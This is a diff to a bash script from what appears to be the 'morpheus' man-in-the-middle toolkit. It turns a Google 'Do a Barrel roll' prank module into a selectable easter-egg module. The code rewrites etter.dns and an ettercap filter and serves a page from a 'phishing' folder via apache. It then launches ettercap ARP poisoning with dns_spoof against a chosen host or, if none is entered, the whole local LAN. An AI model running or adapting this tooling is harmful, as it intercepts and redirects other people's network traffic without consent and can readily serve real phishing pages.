@@ -2314,6 +2314,16 @@ if [ "$?" -eq "0" ]; then
 echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
 rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
 gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
+# chose the easter egg to use under mitm+dns_spoof
+EGG=$(zenity --list --title "☠ GOOGLE EASTER EGGS ☠" --text "List of availables google easter eggs:" --radiolist --column "Pick" --column "Option" TRUE "Do a Barrel roll" FALSE "zerg rush" --width 310 --height 180) > /dev/null 2>&1
+# parse easter egg search string
+if [ "$EGG" = "Do a Barrel roll" ]; then
+  parsed="Do+a+Barrel+roll"
+else
+  parsed="zerg+rush"
+fi
+
+
 
   echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
   sleep 1
@@ -2321,24 +2331,27 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison se
   cd $IPATH/bin
   cp $IPATH/bin/etter.dns etter.rb > /dev/null 2>&1 # backup
   cp $Edns /tmp/etter.dns > /dev/null 2>&1 # backup
-  cp $IPATH/filters/BarrelRoll.eft $IPATH/filters/BarrelRoll.rb > /dev/null 2>&1 # backup
+  cp $IPATH/filters/EasterEgg.eft $IPATH/filters/EasterEgg.rb > /dev/null 2>&1 # backup
   # use SED bash command to config our etter.dns
   sed -i "s|TaRgEt|$IP|g" etter.dns # NO dev/null to report file not existence :D
   sed -i "s|PrE|$PrEfI|g" etter.dns > /dev/null 2>&1
   cp $IPATH/bin/etter.dns $Edns > /dev/null 2>&1
   echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
   # using SED bash command to config redirect.eft
-  sed -i "s|IpAdR|https://www.google.im/search?q=Do+a+Barrel+roll&gws_rd=ssl|g" $IPATH/filters/BarrelRoll.eft > /dev/null 2>&1
+  echo ${BlueF}[☠]${white} google easter egg:${GreenF} $EGG ${Reset};
+  sed -i "s|IpAdR|https://www.google.im/search?q=$parsed&gws_rd=ssl|g" $IPATH/filters/EasterEgg.eft > /dev/null 2>&1
   # copy files needed to apache2 webroot...
-  cp $IPATH/bin/phishing/BarrelRoll.html $ApachE/index.html > /dev/null 2>&1
+  cd phishing/
+  sed -i "s|RePlAcE|$parsed|g" EasterEgg.html > /dev/null 2>&1
+  cp $IPATH/bin/phishing/EasterEgg.html $ApachE/index.html > /dev/null 2>&1
   cd $IPATH
   sleep 1
 
 # compiling packet_drop.eft to be used in ettercap
-xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/BarrelRoll.eft"
-echo ${BlueF}[☠]${white} Compiling BarrelRoll.eft${RedF}!${Reset};
+xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/EasterEgg.eft"
+echo ${BlueF}[☠]${white} Compiling EasterEgg.eft${RedF}!${Reset};
 sleep 1
-xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/BarrelRoll.eft -o $IPATH/output/BarrelRoll.ef && sleep 3"
+xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/EasterEgg.eft -o $IPATH/output/EasterEgg.ef && sleep 3"
 echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
 /etc/init.d/apache2 start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Starting apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
 
@@ -2353,7 +2366,7 @@ echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
         ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost// /$gateway//
         else
         echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
-        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/BarrelRoll_prank -M ARP /$rhost// /$gateway//
+        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/EasterEgg_prank -M ARP /$rhost// /$gateway//
         fi
 
       else
@@ -2363,17 +2376,17 @@ echo ${BlueF}[☠]${white} Start apache2 webserver...${Reset};
         ettercap -T -q -i $InT3R -P dns_spoof -M ARP /$rhost/ /$gateway/
         else
         echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
-        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/BarrelRoll_prank -M ARP /$rhost/ /$gateway/
+        ettercap -T -q -i $InT3R -P dns_spoof -L $IPATH/logs/EasterEgg_prank -M ARP /$rhost/ /$gateway/
         fi
       fi
 
   # clean up
   echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
 /etc/init.d/apache2 stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stoping apache2 webserver" --percentage=0 --auto-close --width 270 > /dev/null 2>&1
-  rm $IPATH/output/BarrelRoll.ef > /dev/null 2>&1
+  rm $IPATH/output/EasterEgg.ef > /dev/null 2>&1
   mv /tmp/etter.dns $Edns > /dev/null 2>&1
   mv $IPATH/bin/etter.rb $IPATH/bin/etter.dns > /dev/null 2>&1
-  mv $IPATH/filters/BarrelRoll.rb $IPATH/filters/BarrelRoll.eft > /dev/null 2>&1 # backup
+  mv $IPATH/filters/EasterEgg.rb $IPATH/filters/EasterEgg.eft > /dev/null 2>&1 # backup
   rm $ApachE/index.html > /dev/null 2>&1
   cd $IPATH
   # port-forward
